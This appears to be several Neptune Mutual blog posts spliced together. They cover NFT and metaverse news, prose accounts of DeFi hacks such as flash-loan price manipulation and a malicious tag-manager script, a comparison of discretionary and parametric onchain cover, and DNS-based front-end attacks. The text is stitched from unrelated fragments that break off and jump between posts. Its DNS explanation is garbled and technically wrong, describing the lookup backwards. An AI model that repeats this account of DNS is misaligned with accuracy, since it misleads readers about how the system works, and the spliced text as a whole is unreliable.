commemorates the year Vera Bradley was founded. The NFTs will be available for presale to Heritage Pass holders from October 1st to October 2nd, with the public sale beginning on October 3rd.</p><p>The Heath Ledger Foundation has immortalized the late actor's unforgettable charisma by releasing photos of him as a collection of NFT photographs. A portion of the proceeds will be used to assist young Australian actors on their way to Hollywood. The intimate portraits show Ledger's charismatic side during a LA River photoshoot. From surfing to skateboarding to simply having fun, Ledger was photographed living life to the fullest. Each NFT photograph will be auctioned off by the Heath Ledger Foundation. In addition to the NFT, winning bidders will receive a physical magazine featuring photos from the collection, a fine art print of their own digital asset signed by the photographer, or a digital collage featuring Heath Ledger photographs taken while skateboarding in Los Angeles.</p><p>Disney's CEO has stated that the company is still exploring and developing its plans for the metaverse. Speaking at Disney's biennial D23 Expo fan convention, Walt Disney Company CEO Bob Chapek discussed how the 98-year-old company will use technology in the future. He claims that Disney intends to use data from both the physical and digital worlds to inform its metaverse policy. Disney has repeatedly referred to its metaverse vision as next generation storytelling. Disney is considering two sectors for their metaverse strategy: data from theme park visits and consumer streaming habits.</p><p>Puma, the iconic sportswear brand, has launched their first ever metaverse experience, dubbed Black Station, which includes a variety of exclusive NFTs with limited edition redeemable physical sneakers. Puma also described Black Station as their own 3D spatial playground, a one-of-a-kind Web3 space that allows their NFT community and all PUMA fans to experience the brand like never before. Consumers can enter Puma's Black Station, where a limited quantity of NFTs and physical sneakers are available, as it is expected to evolve over time. Puma's Black Station site's first two portals reveal new and exclusive sneakers, the Nitro NFRNO and Nitro Fastroid, which are linked to the NFT Nitropass mint. Customers who mint a Nitropass receive two NFTs: one for a redeemable physical product and the other for access to an experience related to their chosen sneakers. Successful NFT purchasers can obtain physical sneakers by burning their NFT.</p><p>When it comes to football, and especially the World Cup, there has long been a tradition of collecting. Fans have been desperate to get their hands on matchday programs and other memorabilia so that they can boast about their collections. The World Cup 2022 is set to be a little different, as it will be the first World Cup to feature FIFA NFTs. The FIFA NFT platform, dubbed FIFA+ Collect, which is set to officially launch later this month, will add a whole new dimension to what it means to be a football collector. These digital collectibles will commemorate some of the tournament's most memorable moments. While NFTs can be expensive, there has been a pledge that FIFA NFTs will be affordable, inclusive, and accessible, implying that all fans have a chance to participate.</p><h2 id=\"onchain-insurance-industry-news\">OnChain Insurance Industry News</h2><p>Compound smart contract coverage protection has been deployed by Tidal Finance for the latest version of compound III.

It might usher in a new golden age when we can revel in our uniqueness, pursue our passions, and reclaim ownership of our personal information. The ability to express our individuality, create unique objects, and see cultural events that were before only a fantasy are all within our reach in virtual worlds. Our physical locations once prevented us from attending beautiful exhibitions and performances, but the advent of the metaverse has removed limitations from all of these cases. Attending a concert by your favorite band or musician who is performing thousands of kilometers away will no longer be an issue.</p><h2 id=\"blockchain-hacks\">Blockchain Hacks</h2><p>DaoSwap was attacked for 580,000 USDT in an attack that allowed users to put the inviter’s address as themselves due to mining rewards that were larger than the fees charged during the swap process and lack of verification. The perpetrator borrowed USDT via several flash-loans. Then he exchanged some USDT for DAO and transferred it to an address believed to be utilized for prize distribution calculation. The attacker then repeatedly swapped USDT and DAO tokens by invoking the contract to issue the reward to himself.</p><p>An attacker was able to deploy a custom smart contract at Nereus Finance that utilized a $51 million flash loan to manipulate the AVAX/USDC Trader Joe LP pool price for a single block, allowing the exploiter to mint 998,000 NXUSD against $508k in collateral. The team subsequently notified the community about the problem via its Discord-based channels, which was picked up by numerous onchain analysis groups, who reported the flash loan exploit as resulting in a $371k profit for the attacker. They also neutralized the exploit by liquidating and stopping the abused JLP market. The exploit was purportedly created by a missed step in the price calculation, which lacked a time-weighted average price mechanism to prevent the manipulation of a single block. </p><p>A private key leak compromised the security of the GERA token, resulting in a loss of $1,480,000. Hackers moved ownership of the smart contract deployer for the GERA token to a different address. The hacker then created two further smart contracts, minted 2,179,340,915.1246 GERA on the Ethereum network, and transmitted 110,000,000 GERA to decentralized exchanges. Additionally, they minted a total of 275,900,000 GERA on the Binance network and distributed 80,543,200 GERA. Consequently, they dumped GERA on decentralized platforms and moved it to centralized exchanges. The team has contacted exchanges to temporarily suspend trading, deposits, and withdrawals of the #GERA token. </p><p>The New Free Dao project on the BSC chain was subject to a flash loan assault, resulting in a loss of around $1.25 million in asset value. The primary cause of this attack is that the method of computing incentives in the contract is very simplistic and solely dependent on the caller's balance, leading to arbitrage through flash loans. The attacker borrowed a significant amount of $WBNB from Pancake via a flashloan, swapped it for $NFD tokens, and then transferred the $NFD tokens to the attack contract, which then created a second attack contract to accept the funds. The latter contract calls on one of the functions in the hacked contract, which is not open source. By decompiling the contract, it is revealed that the function merely calculates and transfers the incentive based on the caller's NFD token balance. In such a fashion, the higher the balance, the higher the reward would be. The exploiter later converted the NFD tokens to WBNB via PancakeSwap, refunded the flashloan, and kept a total profit of 4,481 $WBNB tokens. <br></p><h2 id=\"metaverse-and-nfts\">Metaverse, and NFTs</h2><p>Sony Music Entertainment, the American music giant, has indicated its intention to use NFTs by filing a trademark application covering music and artists under the Columbia Records logo.

        html: '<p><strong>Discretionary and parametric cover are the two models that are being adopted to provide onchain cover policies to mitigate a variety of risks in the blockchain industry.  Whilst they have the same goals – risk mitigation and asset protection – they are fundamentally different in their approach.</strong></p><p><strong>With decentralized insurance finally making its way to the blockchain ecosystem, we look at how these cover models stack up against each other. How are they different? More importantly, which model is more suitable in an emerging blockchain environment where risks are ever present and increasingly harder to quantify?</strong></p><p><strong>Here’s what you need to know about discretionary and parametric models.</strong></p><p><br>All over the world, people turn to insurance as a hedge against the risk of financial losses. The premise is quite simple – individuals and organisations pay money into a pool designed to offset losses that may result from certain risks. By paying monthly premiums into the pool, they essentially transfer their risk exposure to the insurance provider, who by virtue of the pooled funds under their administration, is better equipped to cover against possible losses.</p><p>Should a loss occur, the provider pays out to affected policyholders based on the terms of the policy agreement.</p><p>Of course, there are a number of important points involved, particularly with regard to how risks are evaluated, how losses are verified, how claims are processed, who is eligible to receive a claim, and how payouts are calculated and disbursed. As a matter of fact, these are the main differentiating factors among insurance models today. Let’s examine them now.</p><h2 id="what-is-discretionary-indemnity">What is Discretionary Indemnity?</h2><figure class="kg-card kg-image-card"><img src="https://blog.neptunemutual.com/content/images/2022/11/individual-claim-submission-process.png" class="kg-image" alt loading="lazy" width="1600" height="900" srcset="https://blog.neptunemutual.com/content/images/size/w600/2022/11/individual-claim-submission-process.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/11/individual-claim-submission-process.png 1000w, https://blog.neptunemutual.com/content/images/2022/11/individual-claim-submission-process.png 1600w" sizes="(min-width: 720px) 720px"></figure><p>Indemnity is compensation for damage or loss. Discretionary indemnity describes this compensation in an arrangement where there is no contractual right to the compensation, rather it is payable based on the discretion of the provider.</p><p>As the name implies, cover is discretionary, meaning that there is the possibility that a valid claim is rejected for invalid reasons based on the discretion of the provider or assessor, in which case, of course, the policyholder would not receive a payout.  With discretionary insurance there is absolutely no guarantee of a payout, even if you believe it is due under the terms of the policy.</p><p>As there is no contractual obligation to pay compensation, in many jurisdictions discretionary cover is not considered to be insurance and is therefore not a regulated activity.</p><h2 id="what-is-parametric-cover">What is Parametric Cover?</h2><figure class="kg-card kg-image-card"><img src="https://blog.neptunemutual.com/content/images/2022/11/general-parametric-model.png" class="kg-image" alt loading="lazy" width="1600" height="900" srcset="https://blog.neptunemutual.com/content/images/size/w600/2022/11/general-parametric-model.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/11/general-parametric-model.png 1000w, https://blog.neptunemutual.com/content/images/2022/11/general-parametric-model.png 1600w" sizes="(min-width: 720px) 720px"></figure><p>Parametric cover provides a financial hedge against the occurrence of an event.  The occurrence of the event is defined by the parameters of the policy.  If an event fulfils the parameters of the policy then it will trigger the payout of all policyholders, irrespective of whether policyholders have suffered a loss or not. Parametric cover is particularly suited for hard-to-model, low-frequency but high-intensity loss events.</p><p>Given that events are determined by a limited number of parameters, there is generally significantly less ambiguity around the determination of an event, in comparison to both contract insurance and discretionary insurance which both require the determination of each and every policy holder’s circumstances around the loss of their assets, and whether or not these circumstances conform to the terms of the policy or not.</p><h2 id="how-are-discretionary-and-parametric-cover-models-different">How Are Discretionary and Parametric Cover Models Different?</h2><p>Let’s do a quick comparison of their key features so that you have a better idea of how these cover models differ from each other.</p><h3 id="assessment">Assessment</h3><p>With discretionary models, assessment focuses on the specific nature of each and every individual loss, and whether the loss can be proved to conform to the scope of the policy.</p><p>With parametric models, assessment focuses exclusively on the event itself.  The parameters of the policy are generally fairly simple and binary in nature such that resolution of whether or not an event is considered to have triggered the parameters is clear.</p><p>The two different models have processes that are designed for the assessment of different circumstances.  One significant advantage of the parametric model is that assessing only the event itself is obviously much faster and less resource hungry than assessing a large number of individual loss claims; this leads to faster payouts.  The second principle advantage is that once an event has been confirmed by the resolution process, all policyholders can rely on this decision translating into receiving the payout that they are due.</p><h3 id="payout-policy">Payout Policy</h3><p>Payouts under discretionary covers typically follow indemnity insurance principles, meaning the insurer will pay out a claim based on the value of the loss suffered by each policyholder. Simply put, people who have lost more will get higher payouts.</p><p>With parametric cover, if an event is considered to have triggered a payout, then payouts are based on the amount of cover that a policyholder has paid for, and not the actual physical damage or individual loss suffered. For this reason, the payout is completely independent of actual individual loss (<em>note: unless there are specific terms within the policy to prevent policyholders receiving multiple payouts for the same incident - this type of parameter is designed to avoid protocols compensating users twice, once directly from investor protection fund and secondly via a dedicated cover pool policy</em>).</p><h3 id="claims-process">Claims Process</h3><p>Typically, with discretionary insurance  cover, the policyholder initiates the claims process by submitting evidence of  the damage and loss suffered.</p><p>The insurer will then review this individual loss claim and have their adjuster evaluate the value of the loss and verify, above all, whether the damage is indeed covered under the contractual terms of the policy and therefore whether it is eligible for compensation. If the claim is validated, payout for the approved loss value of the claim is awarded to the policyholder. This entire process can take weeks or months to complete.</p><p>For parametric cover, once the event has been reported then the assessment process is clearly defined, and usually a matter of days; in the case of the Neptune Mutual marketplace the incident resolution is usually set at 7 days with an additional “cooling off” day.  If the resolution is made in favour of a payout, then all policyholders can make a claim and this is usually settled within 7 days.</p><h3 id="usage">Usage</h3><p>The discretionary model is being used in the context of blockchain because of the administrative challenges of applying traditional contract insurance in an anonymous and often peer-to-peer environment.The parametric model has found widespread use in traditional insurance for risks that have little data on which to make predictions, and that are low-frequency but high-intensity when they arise, for example earthquake, flood or other types of natural disaster insurance.   The attributes for which it has found favour in the traditional insurance industry make it a very promising option for use in the blockchain industry, where security risks have a similar risk profile to that of natural disasters.</p><h3 id="premium">Premium</h3><p>A premium is the fee that you pay for cover. Many variables are considered when determining the premium amount.</p><p>Under the discretionary model, premiums are typically based on the level of risk associated with the cover policy. It is challenging for onchain insurance protocols to determine a pricing model for risk given the industry is so young and there is so little historical data on which to determine pricing models.   Not only is it challenging to determine the price of risk, it is also difficult to define the scope of risks.  Understanding what is, and what is not, included within the scope of discretionary cover policies is not at all straightforward, and can lead to tension between those who have been paying policy premiums and those who are underwriting risks.</p><p>Premiums under the parametric cover model are generally higher compared to discretionary cover premiums. This is because in the parametric model, all cover policy holders are compensated if an event is considered to have triggered the parameters, and the amount paid out relates to the amount of the policies that have been underwritten, not on losses incurred.   In this sense parametric cover can be seen much more as a hedging instrument than an insurance product as it can be relied upon to payout if a specific event arises;  the same cannot be said of discretionary cover where, frequently, policyholders claims are rejected and they do not receive a payout.</p><h2 id="is-one-inherently-better-than-the-other">Is One Inherently Better Than The Other?</h2><p>What can be said at this early stage of onchain cover protection is that discretionary and parametric cover models are quite different.  It is important to understand these differences before making a judgement as to which model is better suited to mitigate the risks you are facing.</p><p>In this article we have reviewed the differences between discretionary and parametric cover primarily from the point of view of a cover policyholder, but of course there are significant differences for the liquidity providers.   We explored some of these issues in detail in the blog entitled “<a href="https://blog.neptunemutual.com/understanding-underwriting-capital-not-all-pools-are-alike-know-a-pool-before-you-jump-in/">Understanding Underwriting capital</a>”.</p><p>We are always interested to take questions and understand the views of cover creators, policyholders and liquidity providers, particularly if you have any interesting experiences that you can share with us, if so, please get in touch.</p><h2 id="how-do-these-cover-models-apply-in-the-blockchain-ecosystem-where-protection-is-much-needed">How Do These Cover Models Apply In The Blockchain Ecosystem Where Protection Is Much Needed?</h2><p><a href="https://bitcoinist.com/top-decentralized-insurance-for-defi-investors-in-2021/">Decentralized cover protocols</a> are already making headway in the blockchain space, particularly among DeFi, CeFi, and Web3 projects. This is a welcome development since cover policies help provide an extra layer of protection against hacks, exploits, and scams, all of which are rampant in the industry.</p><p>Protocols that offer discretionary cover work in a similar fashion to traditional insurance in the real world – funds are pooled through policyholders premiums, which are then used by the cover provider to payout valid claims. Nevertheless, there are also distinct features of decentralised cover protocols, such as being owned by their community members, decisions being made by vote, and the bulk of the processes being managed and enforced by smart contracts.</p><figure class="kg-card kg-image-card"><img src="https://blog.neptunemutual.com/content/images/2022/11/defi-insurance-ecosystem.png" class="kg-image" alt loading="lazy" width="1600" height="1215" srcset="https://blog.neptunemutual.com/content/images/size/w600/2022/11/defi-insurance-ecosystem.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/11/defi-insurance-ecosystem.png 1000w, https://blog.neptunemutual.com/content/images/2022/11/defi-insurance-ecosystem.png 1600w" sizes="(min-width: 720px) 720px"></figure><p>However, even in a decentralized setting, the limitations of the discretionary model are already starting to manifest themselves and may hinder its adoption. As mentioned previously, a long claim process resulting from the need to assess large numbers of individual loss claims limits the scalability and efficient execution of the discretionary model. Perhaps the most sensitive issue is the proportion of policyholder claims that are denied. Whether by ambiguity, exclusions, or complications, denied claims favour the returns of liquidity providers over the protection of policyholders, and when the proportion of denied claims becomes greater than half of all claims, this can lead to an erosion of policyholder trust.  Here’s a snapshot of the <a href="https://nexustracker.io/claims">Claims Tracker</a> by Nexus Mutual, a leading Smart Contract Cover provider. Of the 10 claims listed on the image, only 3 were accepted.</p><figure class="kg-card kg-image-card"><img src="https://blog.neptunemutual.com/content/images/2022/11/nexus-mutual-claims.png" class="kg-image" alt loading="lazy" width="1270" height="677" srcset="https://blog.neptunemutual.com/content/images/size/w600/2022/11/nexus-mutual-claims.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/11/nexus-mutual-claims.png 1000w, https://blog.neptunemutual.com/content/images/2022/11/nexus-mutual-claims.png 1270w" sizes="(min-width: 720px) 720px"></figure><h2 id="how-does-parametric-cover-work-on-neptune-mutual%E2%80%99s-marketplace">How Does Parametric Cover Work on Neptune Mutual’s Marketplace?</h2><p>To address these inefficiencies, Neptune Mutual is building a robust ecosystem where CeFi, DeFi, and Web3 projects can seamlessly create parametric covers for their community members.</p><p>These members can then purchase cover policies for the amount they need to cover over a specified duration (up to a maximum of 3 months).</p><p>Underwriting capital for the policies is funded initially by the <a href="https://blog.neptunemutual.com/cover-creators-how-cover-protocols-help-build-confident-investor-communities/">cover creators</a>, and grown further by capital supplied by liquidity providers. In return for providing liquidity, these stakeholders earn income from protocol fees, and gain rewards through other mechanisms within the application.</p><p>Users can also participate in the Neptune Mutual’s marketplace as incident reporters – independent, reliable reporters who will verify the occurrence and scope of events that are reviewed by the community to establish whether they can be resolved as incidents that have triggered policy parameters.</p><p>Upon incident resolution, payouts are made to all policyholders that make a claim. The use of stablecoins helps ensure that cover pools are not subject to market volatility that cryptocurrencies and tokens are exposed to at any given time.</p><h2 id="reduce-your-exposure-to-crypto-market-risks-with-a-parametric-cover">Reduce Your Exposure to Crypto Market Risks With a Parametric Cover </h2><p>Visit the <a href="https://docs.neptunemutual.com/">Neptune Mutual Documentation Page</a> to learn more about our approach to parametric cover protection in the blockchain space.<br></p><hr><h2 id="about-us">About Us</h2><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

        html: "<h2 id=\"tldr\">TL;DR <br></h2><ul><li>Users of Facebook and Instagram can now post NFTs using their digital wallets.</li><li>Formula One trademark filings start paving the way for F1 NFTs. <br></li></ul><p>The Metaverse is quickly becoming an important place for individuals and businesses who want to reach more people. According to new research from a number of firms, the size of the Metaverse market is expected to grow from $61.8 billion in 2022 to $426.9 billion in 2027. A recent report from Juniper Research also links the growth of NFTs to how people use the metaverse. Based on these results, the number of metaverse-related NFT transactions will grow from 600,000 in 2022 to 9.8 million in 2027. Given this potential, a number of places around the world have started to set up a virtual presence using Web3-based services, hoping to capitalize on communication, gaming, and monetization in these areas.</p><h2 id=\"blockchain-hacks\">Blockchain Hacks </h2><p>Optifi, a Solana-based ecological derivative, attempted to update and upgrade on the Solana mainnet, but the deployer inadvertently used the solana close program command, causing their program to shut down. This operational error appears to have been irreversible, resulting in the loss of the locked 661,000 USDC, 95% of which was owned by team members. The team later announced that they would compensate all users' funds and manually settle their positions within a two-week timeframe.<br></p><p>An attacker took advantage of Degen Doge Club by using one of the smart contract methods to get all of the $DDC tokens in the pool and then calling another method of the contract that didn't check for incoming addresses, taking away approximately $104,600 worth of stolen assets. The attacker transferred almost all of the DDC tokens in the victim pool into the said function, then called sync to update the k-value. As the balance of DDC in the pool was reduced after the k-value was updated, the price of $USD corresponding to $DDC was significantly raised, and a large amount of USD was swapped via a small amount of $DDC.<br></p><p>There was an existing vulnerability in which anyone with a VENUS LP token could receive a free reward in Cupid token. The attacker used flash loans to increase liquidity in the Venus/USDT pair in order to obtain Venus LP tokens, which were then distributed to a large number of new addresses in order to gain contract reward. The perpetrator profited $78,622 from this exploit on the BNB chain, causing the token CUPID to fall by more than 90% and the token VENUS to rise by more than 300% and then fall back. <br></p><p>The multi-chain DeFi liquidity hub Kyber Network announced on Twitter that its users have lost $265,000 owing to a front end exploit. The vulnerability is a result of malicious Google Tag Manager code on their KyberSwap website, in which the attackers targeted two whale wallets and obtained authorization to transfer user cash by inserting bogus approvals. The team later announced that they have neutralized the attack and that it is now safe to use all KyberSwap functions including swap aggregator, adding liquidity, and farming. <br></p><h2 id=\"metaverse-and-nfts\">Metaverse, and NFTs </h2><p>In an update on their blog, Facebook's parent company, Meta, said that Facebook's roughly 2.9 billion users would be able to share digital collectibles and NFTs on Facebook and Instagram by linking their wallets to their accounts. This will let people share their digital collectibles across both apps by only having to connect their digital wallets once to either app. It looks like connecting digital wallets to either Facebook or Instagram appears to be limited to the application, rather than through third-party browsers. However, expanding the reach of NFTs to include each and every smartphone with one of Meta’s apps installed could result in additional earnings or adoption for the social media giant.</p><p>Formula One anticipates introducing NFTs, digital collectibles, and cryptocurrency payment support prior to the inaugural Las Vegas Grand Prix in 2023. The United States Patent and Trademark Office has received two fresh trademark applications from F1's trademark department. The filings describe the Las Vegas Strip Circuit's trademark and logo, as well as a comprehensive list of goods and services that the event plans to offer at next year's race. Specific references to NFT and cryptocurrency related offerings as well as blockchain powered transactional services were of special interest. The document describes NFTs that will represent ownership of a wide range of real-world objects, including automotive equipment, ornamental items, apparel, purses, wallets, and even perfume. The filing also mentions downloadable software for managing cryptocurrency transactions using blockchain technology, which may indicate that the race and its organizers intend to accept cryptocurrency payments.</p><p>VeVe, a digital collectibles marketplace, has announced the launch of Marvel art NFTs as part of its latest partnership with Marvel Entertainment. Three Marvel comic book artists have created digital NFT covers for the platform. The Immutable X scaling solution underpins all of the NFTs. Spider-Man and the Black Panther are featured on the one-of-a-kind covers. The NFTs were up for grabs in a silent auction that concluded on September 2. To clarify, during the auction, one could place a private bid on the NFT, with the value of the bid hidden from the other bidders, and the highest bidder would win the digital collectible at the end.</p><h2 id=\"onchain-insurance-industry-news\">OnChain Insurance Industry News</h2><p>Alpha Homora Liquidity Providers on the Optimism Chain can now purchase smart contract vulnerabilities cover on the Insurace Protocol.</p><hr><h2 id=\"about-us\">About Us</h2><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

        html: "<p>Blockchain technology has been one of the biggest disruptive technologies of our time. It utilizes a decentralized model, meaning that control and data storage is done through a distributed ledger network instead of a centralized entity. </p><p>Under this model, information is validated through a distributed consensus that compares blocks of data stored in parallel on multiple nodes across the network. This makes it incredibly difficult to tamper with the information stored on the blockchain because any changes must be validated by all the distributed nodes on the network to achieve a consensus.  In other words, if you have access to a single block in a blockchain, you cannot edit it without affecting the entire chain, and because of the consensus mechanism that compares blocks stored on different nodes then changing one block won't achieve anything.</p><p>However, even though blockchains are inherently secure by virtue of decentralization, the projects that interact with blockchains are still subject to a certain number of cybersecurity risks, and some of these attack vectors will be covered in this article.</p><h2 id=\"platform-based-attacks\">Platform-Based Attacks<strong> </strong></h2><p>Platform-based attacks against the ecosystem of the blockchain-based DeFi ecosystem are becoming more common today. These kinds of attacks make use of flaws in the various web-based content or their frameworks to exploit sensitive data, such as financial or personal information. Hackers are always looking for new methods to take advantage of websites and the visitors to those services. An assault on the domain name server of a website is one of the most prevalent ways. </p><p>The Domain Name System (DNS) system converts domain names into IP addresses. When a user enters a URL, their browser queries their Internet Service Provider (a.k.a. ISP) for the site's IP address. When you try to browse a website, your browser automatically goes to its IP address, but the website doesn't know what it's called because it can't connect directly to it. The DNS server looks up which website name is associated with this IP address and returns that information to your browser, allowing it to connect directly to the website without going through your ISP.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"https://blog.neptunemutual.com/content/images/2022/11/how-does-dns-work.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"2000\" height=\"645\" srcset=\"https://blog.neptunemutual.com/content/images/size/w600/2022/11/how-does-dns-work.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/11/how-does-dns-work.png 1000w, https://blog.neptunemutual.com/content/images/size/w1600/2022/11/how-does-dns-work.png 1600w, https://blog.neptunemutual.com/content/images/size/w2400/2022/11/how-does-dns-work.png 2400w\" sizes=\"(min-width: 720px) 720px\"><figcaption>Illustration of how DNS works</figcaption></figure><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.neptunemutual.com/content/images/2022/11/dns-infographics.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"2000\" height=\"1251\" srcset=\"https://blog.neptunemutual.com/content/images/size/w600/2022/11/dns-infographics.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/11/dns-infographics.png 1000w, https://blog.neptunemutual.com/content/images/size/w1600/2022/11/dns-infographics.png 1600w, https://blog.neptunemutual.com/content/images/size/w2400/2022/11/dns-infographics.png 2400w\" sizes=\"(min-width: 720px) 720px\"></figure><p>DNS is a hierarchical naming scheme used on the Internet for computers and other Internet-connected devices. It translates human-readable names into the numerical IP addresses that computers use to communicate over the network.

Domain name hijacking is one of the common tactics used by hackers to divert users away from their intended target. This form of assault is known as a \"front-end attack,\" since it happens when hackers obtain access to the area of your website that allows users to interact with it. In such a scenario, your content could be hacked and replaced with someone else's, or it could be completely removed!</p><p><a href=\"https://medium.com/cream-finance/postmortem-report-of-dns-hijacking-66ab9c6ce63d\">Cream Finance</a> and PancakeSwap both reported that DNS spoofers had compromised their websites in March 2021. As a result of the attack, the front-end websites for both protocols requested users to enter their seed phrase. If the phrase is entered, the attacker will be able to take control of the users' wallets and drain their funds.</p><p>In another scenario, <a href=\"https://cryptoslate.com/bitcoin-defi-tool-badgerdao-hit-by-estimated-120-million-hack/\">BadgerDAO users lost approximately $120 million</a> in a front-end attack in December of the same year when their API key for Cloudflare, a website security service, was compromised.

In most cases, the malware comes with data payloads that can compromise a DNS server and grant attackers administrative access to the remote server and any programs running on it. DNS tunneling often relies on the external network connectivity of a compromised system, which provides a way into an internal DNS server with network access.</p><h2 id=\"nx-domain-attack\">NX-Domain Attack:</h2><p>A DNS NXDOMAIN flood DDoS attack tries to overload the DNS server by sending a large number of requests for invalid or non-existent records. DNS proxy servers typically respond to these attacks by repeatedly querying the DNS authoritative server. As a result, both the DNS authoritative server and the DNS proxy server are occupied with invalid requests, causing the response time for valid requests to slow down until it eventually stops altogether.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"https://blog.neptunemutual.com/content/images/2022/11/nx-domain-attack.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"2000\" height=\"1571\" srcset=\"https://blog.neptunemutual.com/content/images/size/w600/2022/11/nx-domain-attack.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/11/nx-domain-attack.png 1000w, https://blog.neptunemutual.com/content/images/size/w1600/2022/11/nx-domain-attack.png 1600w, https://blog.neptunemutual.com/content/images/size/w2400/2022/11/nx-domain-attack.png 2400w\" sizes=\"(min-width: 720px) 720px\"><figcaption>Illustration of NXdomain attack</figcaption></figure><h2 id=\"prevention\">Prevention:</h2><ul><li>Web3 users should double-check the addresses associated with every crypto transaction they conduct.

The number of people exploiting this industry are on the rise in-parallel. Scammers continue to use a variety of methods to defraud crypto users of their NFTs, including phishing attacks, marketplace exploits, and others. Multiple reports from blockchain security and risk management organizations indicate that scammers stole more than $100 million in NFTs starting in 2021. Elliptic, a risk management firm, reported that, despite the market downturn, scammers stole the most tokens in July 2022, estimated to be 4,647 assets, and the most value in May 2022, estimated to be $23.9 million.</p><h2 id=\"blockchain-hacks\">Blockchain Hacks </h2><p>Sudoswap imitation disk Sudorare is presumed to have a rug-pull, with the $WETH and $XMON tokens in the contract address being moved to the perpetrator's address and then sold on Uniswap for ETH, making a total profit of about 519.5 ETH, or about $800,000 at the time the event happened. Multiple reports say that the initial deployment funds came from the exchange Kraken, and now neither the Sudorare website nor their Twitter account are accessible.<br></p><p>The KaoyaSwap, a BSC-chain decentralized transaction protocol based on AMM and exchange pools, was attacked, resulting in a loss of approximately 37,294 $BUSD and 271.2 $WBNB. The affected function considers the balance difference of the last pair before and after the swap as the amountOut, before transferring $BNB tokens to the user. This logic will not cause any issues if the last pair appears only once in the swap path. When the last pair only appears one or more times, it will miscalculate the amount that should be transferred to the user. As a result, the attacker devised a swap path that includes two self-constructed tokens, tokens A and B, with the swap path likely being [A, WBNB, B, A, WBNB], with the A and WBNB pair being included twice in this swap path. Later, the malicious actor borrows 1800 WBNB in a flash loan and adds liquidity to the [tokenA, WBNB] and [tokenB, WBNB] pairs. Then he gets 1019 WBNB after the swap and 1029 WBNB after the liquidity removal, leaving himself with the profit.</p><h2 id=\"metaverse-and-nfts\">Metaverse, and NFTs </h2><p>The Beijing municipal government announced a Metaverse innovation and development plan for the next two years, beginning in 2022 and mandating compliance with the recently issued Web3 innovation plan by all districts. Promoting the growth of Metaverse-related industries and assisting Beijing in becoming a digital economy benchmark city are the primary goals of the development action, which makes reference to the Metaverse as a new generation of information technology integration and innovation that would drive the growth of the Internet toward Web3. The action plan mandates that different parts of the city develop technical infrastructure and advocate for its usage in different sectors, such as education and tourism. Integration of technical methods such as 3D visualization and GIS would be part of the development program to create a digital platform for visualizing urban areas and making suitable progress toward the design of digital native intelligent infrastructure.</p><p>The popular cross-platform, cloud-based instant messaging service Telegram is considering incorporating NFT technology into its ecosystem. The creator of the encrypted messaging app has discussed the possibility of a marketplace for NFT-like smart contracts. The founder mentioned the marketplace's potential on his personal Telegram page, stating that it would create a new platform where username holders could transfer them to interested parties in protected deals, with ownership secured on the blockchain via NFT-like smart contracts. He also wrote about other aspects of the Telegram ecosystem that use NFT technology, such as channels, stickers, and emojis.</p><p>Decentralized exchange Uniswap is in discussions with seven different NFT lending protocols to address liquidity fragmentation and information asymmetry. According to a Tweet from the company's head of NFT product, this is the first step toward NFT financialization. Although the lending protocols under consideration are not yet public, the DEX team has demonstrated increased interest in the NFT sector through acquisitions and integration.</p><p>Taco Bell and Decentraland have collaborated on a first-of-its-kind contest in which couples from the United States can get married in the Decentraland Metaverse. The contest for engaged couples will run from August 25 to September 6, wherein they can apply for an opportunity to win the Taco Bell metaverse wedding package. The brand has created a virtual replica of its Las Vegas Wedding Chapel and Cantina in Decentraland for this purpose. The metaverse wedding, scheduled to take place this fall, will be completely customized to the needs of the lucky couple. It will include all of the traditional wedding elements, such as music, the first dance, food, toasts, the exchange of vows and rings, and more.</p><h2 id=\"onchain-insurance-industry-news\">OnChain Insurance Industry News</h2><p>Sherlock Protocol has announced a partnership with Hook Protocol on their mainnet launch.

There’s no better time for collaborative efforts than now. And while competition breeds creativity and innovation, the industry has far too many issues that if not addressed now can continue to plague onchain insurance for years to come.</p><p>Of course, the scope of the cooperation among cover protocols will be tailored for mutual benefit, but there’s no denying that there’s merit to the idea.</p><p>Here are some areas where insurers on the blockchain can bridge gaps and deliver more value across the entire ecosystem.</p><h3 id=\"collaborate-on-more-efficient-information-sharing\">Collaborate on More Efficient Information Sharing</h3><p>Because onchain insurance is built on emerging technology, it is subject to emerging risk. With so much money coming into the space, the probability of hacks is always there. In fact, one may argue that hacks are a necessary evil in blockchain because they expose flaws within a project's security system and lead to better code infrastructure development.</p><p>But with more efficient information sharing among cover protocols, it’s easier to prepare for these risks. As soon as a hack occurs, all other protocols know about it and add that to their checklists to make sure they don't fall victim.</p><h3 id=\"collaborate-to-provide-reinsurance\">Collaborate to Provide Reinsurance</h3><p>Insurance for insurance companies – that’s basically what reinsurance is all about. It’s a stop-loss insurance that lowers underwriting risk for insurers and helps them remain solvent by recovering a portion of amounts paid out on insurance claims.</p><p>Reinsurance is already common practice in real-world insurance, having been a critical part of the global industry for over 150 years. It has also outperformed other segments in the overall insurance space in recent times according to a <a href=\"https://www.mckinsey.com/industries/financial-services/our-insights/global-reinsurance-fit-for-the-future\">2017 report on Global Reinsurance</a> by Mckinsey and Company.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"https://blog.neptunemutual.com/content/images/2022/11/economic-profit-by-segment.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"796\" height=\"596\" srcset=\"https://blog.neptunemutual.com/content/images/size/w600/2022/11/economic-profit-by-segment.png 600w, https://blog.neptunemutual.com/content/images/2022/11/economic-profit-by-segment.png 796w\" sizes=\"(min-width: 720px) 720px\"><figcaption><em>Source: </em><a href=\"https://www.mckinsey.com/industries/financial-services/our-insights/global-reinsurance-fit-for-the-future\"><em>mckinsey.com</em></a></figcaption></figure><p><em>You’ll</em> agree that reinsurance is a necessary component in the 